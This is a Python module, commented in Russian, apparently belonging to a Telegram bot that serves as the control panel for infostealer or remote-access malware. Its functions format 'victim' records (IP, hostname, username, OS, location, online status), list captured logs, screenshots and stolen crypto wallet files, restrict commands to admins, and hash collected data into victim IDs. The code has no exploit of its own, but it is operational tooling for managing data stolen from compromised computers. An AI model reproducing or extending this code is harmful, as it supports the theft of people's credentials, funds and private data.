from aiogram.types import Message
from functools import wraps
from typing import Callable
import hashlib
import json
from datetime import datetime

from bot.config import Config
from bot.database.models import Victim, LogEntry, FileEntry


def is_admin(func: Callable):
    """Декоратор для проверки прав администратора"""

    @wraps(func)
    async def wrapper(message: Message, *args, **kwargs):
        if message.from_user.id not in Config.ADMIN_IDS:
            await message.answer("⛔ У вас нет прав для выполнения этой команды.")
            return
        return await func(message, *args, **kwargs)

    return wrapper


def format_victim_info(victim: Victim, logs: list = None, files: list = None) -> str:
    """Форматирование информации о жертве"""
    first_seen = victim.first_seen.strftime("%Y-%m-%d %H:%M:%S")
    last_seen = victim.last_seen.strftime("%Y-%m-%d %H:%M:%S")
    online_status = "🟢 Онлайн" if victim.is_online else "🔴 Офлайн"

    text = (
        f"💻 <b>Информация о жертве</b>\n\n"
        f"<b>ID:</b> <code>{victim.victim_id}</code>\n"
        f"<b>Статус:</b> {online_status}\n"
        f"<b>IP:</b> {victim.ip_address or 'Неизвестно'}\n"
        f"<b>Hostname:</b> {victim.hostname or 'Неизвестно'}\n"
        f"<b>Username:</b> {victim.username or 'Неизвестно'}\n"
        f"<b>OS:</b> {victim.os_version or 'Неизвестно'}\n"
        f"<b>Страна:</b> {victim.country or 'Неизвестно'}\n"
        f"<b>Город:</b> {victim.city or 'Неизвестно'}\n"
        f"<b>Координаты:</b> {victim.latitude or '?'}, {victim.longitude or '?'}\n"
        f"<b>Впервые замечен:</b> {first_seen}\n"
        f"<b>Последняя активность:</b> {last_seen}\n"
    )

    if logs:
        text += f"\n<b>Последние логи ({len(logs)}):</b>\n"
        for log in logs[:3]:
            log_time = log.created_at.strftime("%H:%M")
            text += f"  • [{log_time}] {log.log_type}: {log.content[:50]}...\n"

    if files:
        text += f"\n<b>Файлы ({len(files)}):</b>\n"
        screenshots = [f for f in files if f.file_type == "screenshot"]
        wallets = [f for f in files if f.file_type == "wallet"]
        if screenshots:
            text += f"  • 📸 Скриншотов: {len(screenshots)}\n"
        if wallets:
            text += f"  • 💰 Кошельков: {len(wallets)}\n"

    if victim.notes:
        text += f"\n<b>Заметка:</b>\n{victim.notes}\n"

    return text


def format_log_entry(log: LogEntry, index: int = None) -> str:
    """Форматирование записи лога"""
    prefix = f"{index}. " if index else ""
    log_time = log.created_at.strftime("%Y-%m-%d %H:%M")

    return f"{prefix}[{log_time}] <b>{log.log_type}:</b>\n<code>{log.content[:300]}</code>\n\n"


def generate_victim_id(data: dict) -> str:
    """Генерация уникального ID жертвы на основе данных"""
    unique_str = json.dumps(data, sort_keys=True)
    return hashlib.sha256(unique_str.encode()).hexdigest()[:32]


def parse_location(ip: str) -> dict:
    """Получение геолокации по IP (заглушка, нужно реализовать через API)"""
    # Здесь можно использовать ip-api.com или类似 сервис
    return {
        "country": "Unknown",
        "city": "Unknown",
        "lat": None,
        "lon": None
    }